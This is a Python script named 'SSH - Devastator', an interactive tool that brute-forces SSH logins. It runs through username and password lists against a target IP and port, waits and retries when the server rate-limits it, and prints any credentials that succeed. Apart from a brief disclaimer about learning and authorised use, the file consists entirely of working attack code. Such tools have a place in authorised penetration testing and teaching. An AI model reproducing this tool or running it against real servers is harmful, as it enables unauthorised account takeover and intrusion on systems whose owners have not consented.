
# Importing libraries :
# pyfiglet: for logo creation
# paramiko: to manage SSH connections
# socket: to manage network connections
# time : to add timeouts
import pyfiglet, paramiko, socket, time

# Create a function to display the logo
def show_logo():
    ascii_banner = pyfiglet.figlet_format("SSH - Devastator")
    print(ascii_banner)

# Logo display
show_logo()
# Creation of a loop to start the software once the “enter” key has been pressed
while True:
    confirmation = str(input("Press the Enter key "))
    if confirmation =="":
        break
    else:
        exit()
print("")

# Display of rules and instructions for use
print("This tool has been created for learning purposes. Only use it on targets that you have permission to attack. The developer is not responsible for any misuse of the software.")
print("Don't hesitate to check the python code. :-)")
# Create a loop to continue using the software if the rules are accepted (using the “Y” key)
while True:
    acceptation = str(input("Do you accept the rules (Y/n) : "))
    if acceptation =="Y":
        break
    elif acceptation =="n":
        print("")
        print("Bro, why ?!?!")
        exit()
    else:
        exit()
print("")

# Display software developers
print("Lead developper : $now_")
print("Additionnal developpers : TechieNeurons")
print("")
#-----------------------------------------------------------------------------------------------------------------------
# Create a function to display time as [Hours:Minutes:Seconds]
def show_time():
    actual_time = time.strftime("%H:%M:%S")
    print("[" + actual_time + "]", end="")

# Create function for SSH server bruteforce
def brute_force_ssh(host, p, user, passwd):
    # Add the current time variable to the function
    global actual_time
    # Add the timeout variable in the function
    global sleep_time
    # Creating an SSH client
    client = paramiko.SSHClient()
    # Chargement de la clé SSH (si une connexion a déjà été effectuée avec le serveur)
    client.load_system_host_keys()
    # Load SSH key (if a connection has already been made to the server)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Testing a user with a password
    try:
        # Add timeout
        time.sleep(sleep_time)
        # Display time and tested values
        show_time() ; print(f" -- Testing username : {user} - password : {passwd}")
        # Make the connection
        client.connect(host, p, user, passwd, timeout=100)
    # Display an error message if there is a problem with the SSH server
    except socket.error as error:
        print("[CRITICAL] -- Socket Error :", error)
        return False
    # Display an error message if there is an error with the login credentials
    except paramiko.AuthenticationException as exception:
        print("[Error] -- Authentication Exception :", exception)
        return False
    # Display an error message if too many tests have been performed + add a waiting time
    except paramiko.SSHException:
        print("[Warning] -- Too much tries : Waiting...")
        time.sleep(20)
        return brute_force_ssh(host, p, user, passwd)
    # Returns True if the connection was successful
    else:
        return True
#-----------------------------------------------------------------------------------------------------------------------
# Request SSH server IP address
hostname = str(input("Enter the IP adress of SSH host : "))

# Requests the port in use and uses 22 if the “enter” key is pressed
port_input = str(input("Enter the port number (Default : 22) : "))
if port_input == "":
    port = 22
else: port = int(port_input)

# Requests a unique username to be tested or the path to a document containing all users to be tested
while True:
    ask_users = str(input("Do you have one user to test or a list ? (One/List) : "))
    # Requests the unique username to be tested
    if ask_users == "One":
        users = str(input("Enter the username of SSH host : "))
        bool_ask_users = True
        bool_ask_cd_users = False
        break
    # Requests the path to the list of users to be tested
    else:
        ask_cd_users = str(input("Enter the path to the usernames file : "))
        with open(ask_cd_users, "r") as users:
            users = users.read().splitlines()
        bool_ask_users = False
        bool_ask_cd_users = True
        break

# If a unique user has been entered: prevents the use of a unique password
# Requests the path to the list of passwords to be tested
if bool_ask_users == True:
    ask_cd_passwords = str(input("Enter the path to the passwords file : "))
    with open(ask_cd_passwords, "r") as passwords:
        passwords = passwords.read().splitlines()
    bool_ask_cd_passwords = True
    bool_ask_passwords = False
# If a user list has been entered, lets you choose whether to use a one-time password or a list of passwords to be tested
# Requests a unique password to be tested or the path to a document containing all the passwords to be tested
elif bool_ask_cd_users == True:
    while True:
        ask_passwords = str(input("Do you have one password to test or a list ? (One/List) : "))
        # Requests the unique password to be tested
        if ask_passwords == "One":
            passwords = str(input("Enter the password of SSH host : "))
            bool_ask_passwords = True
            bool_ask_cd_passwords = False
            break
        # Requests the path to the list of passwords to be tested
        else:
            ask_cd_passwords = str(input("Enter the path to the passwords file : "))
            with open(ask_cd_passwords, "r") as passwords:
                passwords = passwords.read().splitlines()
            bool_ask_cd_passwords = True
            bool_ask_passwords = False
            break
else:
    exit()

# Requests the timeout between each test, setting it to 2 seconds if the “enter” key is pressed.
sleep_time_input = input("Enter the time between each try (Default : 2) : ")
if sleep_time_input == "":
    sleep_time = 2
else: sleep_time = int(sleep_time_input)
#-----------------------------------------------------------------------------------------------------------------------
# Calls the bruteforce function if there is :
# user list + password list
if bool_ask_cd_users == True and bool_ask_cd_passwords == True:
    for user in users:
        for password in passwords:
            # Application of the condition if “True” has been returned in the bruteforce function
            if brute_force_ssh(hostname, port, user, password):
                print("----------")
                print("[SUCCESS] -- Username = ", user, "- Password = ", password)
                exit()
# Calls the bruteforce function if there is :
# unique user + list of passwords
elif bool_ask_users == True and bool_ask_cd_passwords == True:
    for password in passwords:
        # Application of the condition if “True” has been returned in the bruteforce function
        if brute_force_ssh(hostname, port, users, password):
            print("----------")
            print("[SUCCESS] -- Username = ", users, "- Password = ", password)
            exit()
# Calls the bruteforce function if there is :
# user list + unique password
elif bool_ask_cd_users == True and bool_ask_passwords == True:
    for user in users:
        # Application of the condition if “True” has been returned in the bruteforce function
        if brute_force_ssh(hostname, port, user, passwords):
            print("----------")
            print("[SUCCESS] -- Username = ", user, "- Password = ", passwords)
            exit()